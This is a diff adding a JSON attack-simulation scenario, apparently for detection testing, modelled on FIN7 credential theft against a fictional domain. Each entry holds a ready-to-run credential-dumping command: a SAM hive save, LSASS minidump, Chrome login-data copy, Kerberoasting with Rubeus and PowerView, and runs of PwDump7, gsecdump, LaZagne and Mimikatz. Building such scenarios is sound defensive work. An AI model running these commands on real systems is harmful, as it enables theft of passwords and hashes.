@@ -1,0 +1,82 @@
+{
+  "scenarioName": "FIN7-inspired hybrid identity credential access",
+  "startTime": "2026-04-30T13:00:00.0000000Z",
+  "tenantDomain": "wiesbadenresearch.example",
+  "adDomain": "WIESBADEN",
+  "infrastructure": {
+    "domainControllers": 2,
+    "windows11Endpoints": 10,
+    "ubuntuEndpoints": 5,
+    "entraConnectServers": 1
+  },
+  "compromisedUser": "victor.alvarez@wiesbadenresearch.example",
+  "initialDevice": "WIN11-04.corp.wiesbaden.example",
+  "attackVectors": [
+    {
+      "Title": "Credentials in Registry Script",
+      "Technique": "T1552.002",
+      "Offset": 15,
+      "Command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\wrstage\\collect-reg-creds.ps1"
+    },
+    {
+      "Title": "Dump SAM Registry Hive via reg save Command",
+      "Technique": "T1003.002",
+      "Offset": 22,
+      "Command": "reg.exe save HKLM\\SAM C:\\ProgramData\\wrstage\\sam.save /y"
+    },
+    {
+      "Title": "Collect Browser Data via Esentutl using PowerShell Script",
+      "Technique": "T1555.003",
+      "Offset": 27,
+      "Command": "esentutl.exe /y \"C:\\Users\\victor.alvarez\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" /d C:\\ProgramData\\wrstage\\LoginData.db"
+    },
+    {
+      "Title": "Kerberoasting using Rubeus",
+      "Technique": "T1558.003",
+      "Offset": 35,
+      "Command": "Rubeus.exe kerberoast /ldapfilter:\"(servicePrincipalName=*)\" /nowrap /outfile:C:\\ProgramData\\wrstage\\roast.txt"
+    },
+    {
+      "Title": "Kerberoasting using PowerShell Empire's Invoke-Kerberoast Script",
+      "Technique": "T1558.003",
+      "Offset": 42,
+      "Command": "powershell.exe -NoProfile -ExecutionPolicy Bypass Import-Module .\\PowerView.ps1; Invoke-Kerberoast -OutputFormat Hashcat"
+    },
+    {
+      "Title": "Dump LSASS Process to Minidump File",
+      "Technique": "T1003.001",
+      "Offset": 50,
+      "Command": "procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\wrstage\\lsass.dmp"
+    },
+    {
+      "Title": "Dump Passwords using PwDump7",
+      "Technique": "T1003.002",
+      "Offset": 56,
+      "Command": "PwDump7.exe -o C:\\ProgramData\\wrstage\\pwdump7.txt"
+    },
+    {
+      "Title": "Dump Passwords using gsecdump",
+      "Technique": "T1003.001",
+      "Offset": 60,
+      "Command": "gsecdump.exe -a > C:\\ProgramData\\wrstage\\gsecdump.txt"
+    },
+    {
+      "Title": "Dump Passwords using LaZagne",
+      "Technique": "T1555",
+      "Offset": 65,
+      "Command": "LaZagne.exe all -oN -output C:\\ProgramData\\wrstage\\lazagne"
+    },
+    {
+      "Title": "Dump Windows Passwords with Obfuscated Mimikatz",
+      "Technique": "T1003.001",
+      "Offset": 70,
+      "Command": "rundll32.exe C:\\ProgramData\\wrstage\\kiwi.dll,StartW /sekurlsa::logonpasswords /exit"
+    },
+    {
+      "Title": "Dump Windows Passwords with Original Mimikatz",
+      "Technique": "T1003.001",
+      "Offset": 73,
+      "Command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
+    }
+  ]
+}
